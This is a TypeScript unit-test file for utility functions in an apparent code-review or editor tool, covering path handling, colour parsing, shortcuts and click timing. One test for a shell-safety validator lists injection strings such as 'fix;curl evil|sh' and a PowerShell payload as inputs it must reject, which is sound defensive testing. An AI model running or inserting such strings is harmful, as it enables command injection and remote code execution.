import { expect, test } from "bun:test";
import { currentTranslator } from "@thinkrail/locales/react";
import {
	ancestorPaths,
	compactAge,
	cssColorToHex,
	DOUBLE_CLICK_SETTLE_MS,
	doubleClickPendingMs,
	fileName,
	firstClickOnly,
	firstNonBlankLine,
	hasPlatformModifier,
	isAbsolutePath,
	isRecord,
	isShellInert,
	layoutResourceIdentity,
	normalizePath,
	parseTupleKey,
	platformFamily,
	platformShortcutLabel,
	projectRelativePath,
	relativeTime,
	shallowEqualArrays,
	tupleKey,
} from "./utils";

test("platformFamily classifies the browser-reported platform", () => {
	expect(platformFamily("MacIntel")).toBe("apple");
	expect(platformFamily("Win32")).toBe("windows");
	expect(platformFamily("Linux x86_64")).toBe("linux");
	expect(platformFamily("")).toBe("other");
});

test("platform shortcuts use Ctrl on non-Apple platforms", () => {
	const platform = "Linux x86_64";
	expect(platformShortcutLabel("B", { platform })).toBe("Ctrl+B");
	expect(platformShortcutLabel("N", { platform, alt: true })).toBe("Ctrl+Alt+N");
	expect(hasPlatformModifier({ ctrlKey: true, metaKey: false }, platform)).toBe(true);
	expect(hasPlatformModifier({ ctrlKey: false, metaKey: true }, platform)).toBe(false);
	expect(hasPlatformModifier({ ctrlKey: true, metaKey: true }, platform)).toBe(false);
});

test("platform shortcuts use Command on Apple platforms", () => {
	const platform = "MacIntel";
	expect(platformShortcutLabel("B", { platform })).toBe("⌘B");
	expect(platformShortcutLabel("N", { platform, alt: true })).toBe("⌥⌘N");
	expect(hasPlatformModifier({ ctrlKey: false, metaKey: true }, platform)).toBe(true);
	expect(hasPlatformModifier({ ctrlKey: true, metaKey: false }, platform)).toBe(false);
	expect(hasPlatformModifier({ ctrlKey: true, metaKey: true }, platform)).toBe(false);
});

test("isShellInert accepts only names that stay literal in POSIX, PowerShell, and cmd", () => {
	expect(isShellInert("olga/plan-page")).toBe(true);
	expect(isShellInert("release-1.2_rc")).toBe(true);
	for (const hostile of [
		"",
		"-x",
		"fix;curl evil|sh",
		"a';Write-Output PWNED;#",
		"a&b",
		"$(x)",
		"a`b",
		"a%b%",
		"a b",
	]) {
		expect(isShellInert(hostile)).toBe(false);
	}
});

test("cssColorToHex expands short hex and passes full hex through", () => {
	expect(cssColorToHex("#fff")).toBe("#ffffff");
	expect(cssColorToHex("#FfF")).toBe("#FFffFF");
	expect(cssColorToHex("#abc4")).toBe("#aabbcc44");
	expect(cssColorToHex("#ffffff")).toBe("#ffffff");
	expect(cssColorToHex("#a9b7c6")).toBe("#a9b7c6");
	expect(cssColorToHex(" #2b2b2b ")).toBe("#2b2b2b");
});

test("cssColorToHex canonicalizes serialized sRGB colors", () => {
	expect(cssColorToHex("color(srgb 1 0.5 0 / 20%)")).toBe("#ff800033");
	expect(cssColorToHex("color(srgb 0.2 0.4 0.6)")).toBe("#336699");
});

test("cssColorToHex reads unparseable values as unset", () => {
	expect(cssColorToHex("")).toBe("");
	expect(cssColorToHex("not-a-color")).toBe("");
});

test("tuple keys keep delimiter-bearing identity tuples distinct and parse only their namespace", () => {
	const first = tupleKey("resource", "a:b", "c");
	const second = tupleKey("resource", "a", "b:c");
	expect(first).not.toBe(second);
	expect(parseTupleKey(first, "resource")).toEqual(["a:b", "c"]);
	expect(parseTupleKey(first, "other")).toBeNull();
	expect(parseTupleKey("resource:not-json", "resource")).toBeNull();
});

test("layout resource identity ignores placement ids and separates delimiter-bearing diff tuples", () => {
	expect(layoutResourceIdentity({ kind: "file", id: "one", name: "One", path: "src/a:b.ts" })).toBe(
		layoutResourceIdentity({ kind: "file", id: "two", name: "Two", path: "src/a:b.ts" }),
	);
	expect(
		layoutResourceIdentity({
			kind: "diff",
			id: "one",
			name: "One",
			path: "a",
			scope: { kind: "commit", sha: "x:commit:y" },
		}),
	).not.toBe(
		layoutResourceIdentity({
			kind: "diff",
			id: "two",
			name: "Two",
			path: "a:commit:x",
			scope: { kind: "commit", sha: "y" },
		}),
	);
});

test("a file comparison is identified by its two paths, apart from the git diff of either", () => {
	const compare = (before: string, path: string) =>
		layoutResourceIdentity({ kind: "diff", path, before });
	expect(compare("b.html", "a.html")).toBe(compare("b.html", "a.html"));
	expect(compare("b.html", "a.html")).not.toBe(compare("c.html", "a.html"));
	expect(compare("b.html", "a.html")).not.toBe(
		layoutResourceIdentity({ kind: "diff", path: "a.html", scope: { kind: "uncommitted" } }),
	);
});

test("a changes review tab is identified by its scope alone, apart from any file diff", () => {
	const branch = layoutResourceIdentity({
		kind: "changes",
		id: "one",
		name: "Changes",
		scope: { kind: "branch" },
	});
	expect(branch).toBe(
		layoutResourceIdentity({
			kind: "changes",
			id: "two",
			name: "Other",
			scope: { kind: "branch" },
		}),
	);
	expect(branch).not.toBe(
		layoutResourceIdentity({
			kind: "changes",
			id: "one",
			name: "Changes",
			scope: { kind: "commit", sha: "abc" },
		}),
	);
	expect(branch).not.toBe(
		layoutResourceIdentity({
			kind: "diff",
			id: "one",
			name: "a",
			path: "a",
			scope: { kind: "branch" },
		}),
	);
});

test("fileName is a path's last segment whichever separator wrote it", () => {
	expect(fileName("C:\\Users\\me\\repo")).toBe("repo");
	expect(fileName("/home/me/repo/")).toBe("repo");
	expect(fileName("src/foo.ts")).toBe("foo.ts");
	expect(fileName("C:\\")).toBe("C:");
	expect(fileName("")).toBe("");
});

test("normalizePath brings both separator styles to one form and drops a leading ./", () => {
	expect(normalizePath("src/foo.ts")).toBe("src/foo.ts");
	expect(normalizePath("C:\\wt\\src\\foo.ts")).toBe("C:/wt/src/foo.ts");
	expect(normalizePath("./src/foo.ts")).toBe("src/foo.ts");
	expect(normalizePath(".//src/foo.ts")).toBe("src/foo.ts");
	expect(normalizePath(".\\src\\foo.ts")).toBe("src/foo.ts");
	expect(normalizePath(".")).toBe(".");
	expect(normalizePath("../src/foo.ts")).toBe("../src/foo.ts");
});

test("projectRelativePath yields the worktree-relative tab identity from every reported form", () => {
	const root = "/wt/ws";
	expect(projectRelativePath("src/foo.ts", root)).toBe("src/foo.ts");
	expect(projectRelativePath("./src/foo.ts", root)).toBe("src/foo.ts");
	expect(projectRelativePath("/wt/ws/src/foo.ts", root)).toBe("src/foo.ts");
	expect(projectRelativePath("/wt/ws/src/foo.ts", `${root}/`)).toBe("src/foo.ts");
	expect(projectRelativePath("/wt/ws/src/../foo.ts", root)).toBe("foo.ts");
	expect(projectRelativePath("src/./nested/../foo.ts", root)).toBe("src/foo.ts");
	expect(projectRelativePath("../outside.ts", root)).toBe("../outside.ts");
	expect(projectRelativePath("C:\\wt\\ws\\src\\..\\foo.ts", "C:\\wt\\ws")).toBe("foo.ts");
	expect(projectRelativePath("c:/WT/ws/Src/Foo.ts", "C:/wt/WS")).toBe("Src/Foo.ts");
	expect(projectRelativePath("C:/Repository/foo.ts", "c:/repo")).toBe("C:/Repository/foo.ts");
	expect(projectRelativePath("D:/Repo/foo.ts", "c:/repo")).toBe("D:/Repo/foo.ts");
	expect(projectRelativePath("/WT/ws/src/foo.ts", root)).toBe("/WT/ws/src/foo.ts");
	expect(projectRelativePath("/src/foo.ts", "/")).toBe("src/foo.ts");
	expect(projectRelativePath("C:/src/foo.ts", "C:/")).toBe("src/foo.ts");
	expect(projectRelativePath("/elsewhere/foo.ts", root)).toBe("/elsewhere/foo.ts");
	expect(projectRelativePath("/wt/ws/src/foo.ts")).toBe("/wt/ws/src/foo.ts");
});

test("isAbsolutePath accepts posix and Windows roots, in either separator style", () => {
	expect(isAbsolutePath("/wt/src/foo.ts")).toBe(true);
	expect(isAbsolutePath("C:/wt/foo.ts")).toBe(true);
	expect(isAbsolutePath("C:\\wt\\foo.ts")).toBe(true);
	expect(isAbsolutePath("src/foo.ts")).toBe(false);
	expect(isAbsolutePath("./src/foo.ts")).toBe(false);
	expect(isAbsolutePath("")).toBe(false);
});

test("shallowEqualArrays compares element-wise and treats absent as unequal", () => {
	const same = ["a", "b"];
	expect(shallowEqualArrays(same, same)).toBe(true);
	expect(shallowEqualArrays(["a", "b"], ["a", "b"])).toBe(true);
	expect(shallowEqualArrays(["a", "b"], ["a", "c"])).toBe(false);
	expect(shallowEqualArrays(["a"], ["a", "b"])).toBe(false);
	expect(shallowEqualArrays([], [])).toBe(true);
	expect(shallowEqualArrays([Number.NaN], [Number.NaN])).toBe(true);
	expect(shallowEqualArrays(undefined, [])).toBe(false);
	expect(shallowEqualArrays(undefined, undefined)).toBe(true);
});

test("relativeTime measures against the given now, not the clock", () => {
	const now = 1_000_000_000_000;
	const t = currentTranslator();
	expect(relativeTime(t, now - 59_000, now)).toBe("just now");
	expect(relativeTime(t, now - 5 * 60_000, now)).toBe("5m ago");
	expect(relativeTime(t, now - 3 * 3_600_000, now)).toBe("3h ago");
	expect(relativeTime(t, now - 2 * 86_400_000, now)).toBe("2d ago");
	expect(compactAge(t, now - 20 * 60_000, now)).toBe("<1h");
	expect(compactAge(t, now - 5 * 3_600_000, now)).toBe("5h");
	expect(compactAge(t, now - 13 * 86_400_000, now)).toBe("13d");
	expect(compactAge(t, now - 20 * 86_400_000, now)).toBe("2w");
	expect(compactAge(t, now - 100 * 86_400_000, now)).toBe("3mo");
});

test("ancestorPaths lists a path's parent folders outermost first", () => {
	expect(ancestorPaths("src/auth/login.ts")).toEqual(["src", "src/auth"]);
	expect(ancestorPaths("README.md")).toEqual([]);
});

test("isRecord accepts plain objects only", () => {
	expect(isRecord({ a: 1 })).toBe(true);
	expect(isRecord([])).toBe(false);
	expect(isRecord(null)).toBe(false);
	expect(isRecord("x")).toBe(false);
});

test("firstNonBlankLine skips blank lines and trims", () => {
	expect(firstNonBlankLine("first\nsecond")).toBe("first");
	expect(firstNonBlankLine("\n  \n  hello  \nworld")).toBe("hello");
	expect(firstNonBlankLine(" \n\t\n")).toBeUndefined();
	expect(firstNonBlankLine("")).toBeUndefined();
});

const LONG_AGO = -1_000_000;

test("firstClickOnly runs on a first click or keyboard activation, not a double click's second", () => {
	let runs = 0;
	const onClick = firstClickOnly(
		() => {
			runs += 1;
		},
		() => LONG_AGO,
	);
	onClick({ detail: 0 });
	onClick({ detail: 1 });
	onClick({ detail: 2 });
	onClick({ detail: 3 });
	expect(runs).toBe(2);
});

test("doubleClickPendingMs counts down the double-click window from a first click", () => {
	firstClickOnly(
		() => {},
		() => LONG_AGO,
	)({ detail: 1 });
	expect(doubleClickPendingMs(LONG_AGO)).toBe(DOUBLE_CLICK_SETTLE_MS);
	expect(doubleClickPendingMs(LONG_AGO + 100)).toBe(DOUBLE_CLICK_SETTLE_MS - 100);
	expect(doubleClickPendingMs(LONG_AGO + DOUBLE_CLICK_SETTLE_MS)).toBe(0);
	expect(doubleClickPendingMs()).toBe(0);
});

test("doubleClickPendingMs ignores a keyboard activation", () => {
	firstClickOnly(
		() => {},
		() => LONG_AGO,
	)({ detail: 1 });
	firstClickOnly(
		() => {},
		() => LONG_AGO + 1_000,
	)({ detail: 0 });
	expect(doubleClickPendingMs(LONG_AGO + 1_000)).toBe(0);
});
